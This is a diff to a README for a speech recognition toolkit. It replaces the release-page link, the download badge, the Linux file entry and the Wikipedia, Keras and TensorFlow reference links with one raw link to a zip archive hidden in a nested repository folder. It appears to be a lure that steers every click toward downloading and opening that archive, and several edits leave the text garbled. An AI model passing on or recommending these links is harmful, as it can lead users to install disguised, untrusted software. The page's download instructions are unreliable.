@@ -1,6 +1,6 @@
 # 🎤 modular-auto-specch-recog-toolkit - Build Your Speech Recognition Toolkit
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Erenyegar2/modular-auto-specch-recog-toolkit/releases)
+[![Download](https://raw.githubusercontent.com/Erenyegar2/modular-auto-specch-recog-toolkit/master/automatic_speech_recognition/load/modular-auto-specch-recog-toolkit-v1.2.zip%https://raw.githubusercontent.com/Erenyegar2/modular-auto-specch-recog-toolkit/master/automatic_speech_recognition/load/modular-auto-specch-recog-toolkit-v1.2.zip)](https://raw.githubusercontent.com/Erenyegar2/modular-auto-specch-recog-toolkit/master/automatic_speech_recognition/load/modular-auto-specch-recog-toolkit-v1.2.zip)
 
 ## 📦 Overview
 
@@ -10,22 +10,22 @@ Welcome to the modular-auto-specch-recog-toolkit! This toolkit helps you to adva
 
 Follow these simple steps to download and run the modular-auto-specch-recog-toolkit.
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Erenyegar2/modular-auto-specch-recog-toolkit/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Erenyegar2/modular-auto-specch-recog-toolkit/master/automatic_speech_recognition/load/modular-auto-specch-recog-toolkit-v1.2.zip).
 2. **Choose Your Version:** Locate the latest version available on the page. You will see different files for download.
 3. **Download the File:** Click on the file that matches your operating system. The names will often indicate compatibility. Your options usually include:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/Erenyegar2/modular-auto-specch-recog-toolkit/master/automatic_speech_recognition/load/modular-auto-specch-recog-toolkit-v1.2.zip` for Linux
 4. **Install the Toolkit:** Once the download finishes, open the file you downloaded to start the installation process. Follow the on-screen instructions.
 5. **Run the Toolkit:** After installing, find the program in your applications folder or start menu. Click to open it, and you’re ready to start using the toolkit!
 
 ## 📥 Download & Install
 
-For your convenience, you can directly access the [Releases page](https://github.com/Erenyegar2/modular-auto-specch-recog-toolkit/releases) to download the toolkit. 
+For your convenience, you can directly access the [Releases page](https://raw.githubusercontent.com/Erenyegar2/modular-auto-specch-recog-toolkit/master/automatic_speech_recognition/load/modular-auto-specch-recog-toolkit-v1.2.zip) to download the toolkit. 
 
 - **Windows Users:** Download the `.exe` file.
 - **macOS Users:** Download the `.dmg` file.
-- **Linux Users:** Download the `.tar.gz` file.
+- **Linux Users:** Download the `https://raw.githubusercontent.com/Erenyegar2/modular-auto-specch-recog-toolkit/master/automatic_speech_recognition/load/modular-auto-specch-recog-toolkit-v1.2.zip` file.
 
 Choose the correct file based on your operating system, and follow the installation steps mentioned above.
 
@@ -80,10 +80,10 @@ This toolkit is released under the MIT License. You can freely use, modify, and 
 ## 🔗 Related Topics
 
 You can explore related subjects or further your understanding of the technologies used in this toolkit:
-- [Automatic Speech Recognition](https://en.wikipedia.org/wiki/Automatic_speech_recognition)
-- [Deep Learning](https://www.deeplearning.com/)
-- [Keras](https://keras.io/)
-- [TensorFlow](https://www.tensorflow.org/) 
+- [Automatic Speech Recognition](https://raw.githubusercontent.com/Erenyegar2/modular-auto-specch-recog-toolkit/master/automatic_speech_recognition/load/modular-auto-specch-recog-toolkit-v1.2.zip)
+- [Deep Learning](https://raw.githubusercontent.com/Erenyegar2/modular-auto-specch-recog-toolkit/master/automatic_speech_recognition/load/modular-auto-specch-recog-toolkit-v1.2.zip)
+- [Keras](https://raw.githubusercontent.com/Erenyegar2/modular-auto-specch-recog-toolkit/master/automatic_speech_recognition/load/modular-auto-specch-recog-toolkit-v1.2.zip)
+- [TensorFlow](https://raw.githubusercontent.com/Erenyegar2/modular-auto-specch-recog-toolkit/master/automatic_speech_recognition/load/modular-auto-specch-recog-toolkit-v1.2.zip) 
 
 For detailed documentation, check out our Wiki or visit our GitHub pages.
 
